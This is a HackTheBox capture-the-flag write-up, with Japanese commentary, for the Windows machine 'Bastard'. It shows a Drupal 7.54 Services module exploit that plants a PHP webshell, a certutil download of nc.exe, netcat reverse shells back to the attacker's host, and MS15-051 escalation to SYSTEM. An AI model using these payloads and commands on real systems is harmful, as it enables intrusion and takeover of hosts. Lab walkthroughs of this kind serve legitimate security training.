+++
title = "HackTheBox - Bastard Writeup"
date = "2026-04-12"
description = "Drupal 7.54 の Services モジュール RCE から MS15-051 で SYSTEM 奪取"
tags = ["HackTheBox", "CTF", "Windows", "Drupal", "RCE", "MS15-051", "certutil", "Medium"]
categories = ["HackTheBox"]
toc = true
draft = false
+++

## Machine Info

| Field | Details |
|-------|---------|
| Machine | Bastard |
| OS | Windows Server 2008 R2 Datacenter |
| IP | 10.129.17.191 |
| Difficulty | Medium |

---

## Reconnaissance

### Nmap Scan

```bash
nmap -sV 10.129.17.191
```

```text
PORT      STATE SERVICE VERSION
80/tcp    open  http    Microsoft IIS httpd 7.5
135/tcp   open  msrpc   Microsoft Windows RPC
49154/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

### Gobuster

```bash
gobuster dir -u 10.129.17.191 -w /usr/share/wordlists/dirb/common.txt
```

```text
rest       (Status: 200) [Size: 62]
robots.txt (Status: 200) [Size: 2189]
index.php  (Status: 200) [Size: 7634]
```

`/rest` にアクセスすると `Services Endpoint "rest_endpoint" has been setup successfully.` と表示される。  
`/CHANGELOG.txt` から Drupal **7.54** と判明。

---

## Initial Access - Drupal Services Module RCE

### Exploit 取得

```bash
searchsploit drupal 7
searchsploit -m exploit/php/webapps/41564.php
```

### 41564.php 書き換え箇所

```php
$url = 'http://10.129.17.191';
$endpoint_path = '/rest';
$endpoint = 'rest_endpoint';

$file = [
    'filename' => 'shell.php',
    'data' => '<?php system($_REQUEST["cmd"]); ?>'
];
```

### php-curl インストール

```bash
sudo apt install php-curl
```

### Exploit 実行

```bash
php 41564.php
```

```text
Stored session information in session.json
Stored user information in user.json
Cache contains 7 entries
File written: http://10.129.17.191/shell.php
```

---

## RCE 確認

```bash
curl http://10.129.17.191/shell.php?cmd=whoami
```

```text
nt authority\iusr
```

---

## Upload / Delivery

### HTTPサーバー起動

```bash
cd /usr/share/windows-binaries
python3 -m http.server 80
```

### nc.exe をターゲットにダウンロード

```bash
curl "http://10.129.17.191/shell.php?cmd=certutil+-urlcache+-split+-f+http://10.10.16.166/nc.exe+nc.exe"
```

```text
****  Online  ****
  0000  ...
  e800
CertUtil: -URLCache command completed successfully.
```

---

## Listener

```bash
nc -lnvp 4444
```

---

## Trigger

```bash
curl "http://10.129.17.191/shell.php?cmd=nc.exe+-e+cmd.exe+10.10.16.166+4444"
```

```text
listening on [any] 4444 ...
connect to [10.10.16.166] from (UNKNOWN) [10.129.17.191]
Microsoft Windows [Version 6.1.7600]
```

---

## Foothold

```bash
whoami
```

```text
nt authority\iusr
```

---

## System Info

```bash
systeminfo
```

```text
Host Name:       BASTARD
OS Name:         Microsoft Windows Server 2008 R2 Datacenter
OS Version:      6.1.7600 N/A Build 7600
System Type:     x64-based PC
Hotfix(s):       N/A
```

`Hotfix(s): N/A` → パッチ未適用。カーネルエクスプロイト確定。

---

## Post Exploitation

```bash
dir /s /b root.txt
```

```text
C:\Users\Administrator\Desktop\root.txt
```

---

## Privilege Escalation - MS15-051

### ms15-051x64.exe 取得

```bash
wget https://github.com/SecWiki/windows-kernel-exploits/raw/master/MS15-051/MS15-051-KB3045171.zip
unzip MS15-051-KB3045171.zip
cd MS15-051-KB3045171
python3 -m http.server 80
```

### ターゲットにダウンロード

```bash
curl "http://10.129.17.191/shell.php?cmd=certutil+-urlcache+-split+-f+http://10.10.16.166/ms15-051x64.exe+ms15-051x64.exe"
```

### 動作確認

```bash
ms15-051x64.exe whoami
```

```text
[#] ms15-051 fixed by zcgonvh
[!] process with pid: 2144 created.
==============================
nt authority\system
```

---

## SYSTEM Shell

```bash
nc -lnvp 5555
```

```bash
ms15-051x64.exe "nc.exe -e cmd.exe 10.10.16.166 5555"
```

```text
[#] ms15-051 fixed by zcgonvh
[!] process with pid: 1772 created.
==============================

listening on [any] 5555 ...
connect to [10.10.16.166] from (UNKNOWN) [10.129.17.191] 50772
Microsoft Windows [Version 6.1.7600]

C:\inetpub\drupal-7.54>whoami
nt authority\system
```

---

## Flags

### User

```bash
more C:\Users\dimitris\Desktop\user.txt
```

### Root

```bash
more C:\Users\Administrator\Desktop\root.txt
```

---

## Summary

Drupal 7.54 Services モジュール RCE (EDB-41564) → webshell (shell.php) → nc.exe でリバースシェル (iusr) → MS15-051 カーネルエクスプロイト → NT AUTHORITY\SYSTEM

